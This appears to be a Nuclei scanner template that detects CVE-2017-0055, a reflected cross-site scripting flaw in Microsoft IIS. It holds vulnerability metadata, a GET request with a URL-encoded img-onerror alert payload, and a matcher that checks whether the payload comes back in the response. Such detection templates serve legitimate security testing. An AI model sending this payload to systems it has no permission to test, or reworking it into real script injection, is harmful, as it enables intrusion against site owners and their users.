id: CVE-2017-0055

info:
  name: Cross Site Scripting / HTML injection vulnerability in Microsoft Internet Information Services web server
  author: pikpikcu
  severity: medium
  description: Microsoft Internet Information Server (IIS) in Windows Vista SP2; Windows Server 2008 SP2 and R2; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to perform cross-site scripting and run script with local user privileges via a crafted request, aka "Microsoft IIS Server XSS Elevation of Privilege Vulnerability."
  reference:
    - https://www.sidertia.com/Home/Community/News/2017/03/15/Fixed-the-IIS-Server-XSS-Vulnerability-discovered-by-Sidertia
    - https://vulners.com/packetstorm/PACKETSTORM:141671
    - http://www.securitytracker.com/id/1038012
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/GNXB/POC
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2017-0055
    cwe-id: CWE-79
    epss-score: 0.00548
    epss-percentile: 0.77158
    cpe: cpe:2.3:o:microsoft:windows_10:-:*:*:*:*:*:*:*
  metadata:
    vendor: microsoft
    product: windows_10

http:
  - method: GET
    path:
      - "{{BaseURL}}/uncpath/%3Cimg%20onerror=alert('xss')%20src=/%3E:/"

    matchers:
      - type: word
        words:
          - "<img onerror=alert('xss') src=/>:"
        part: body
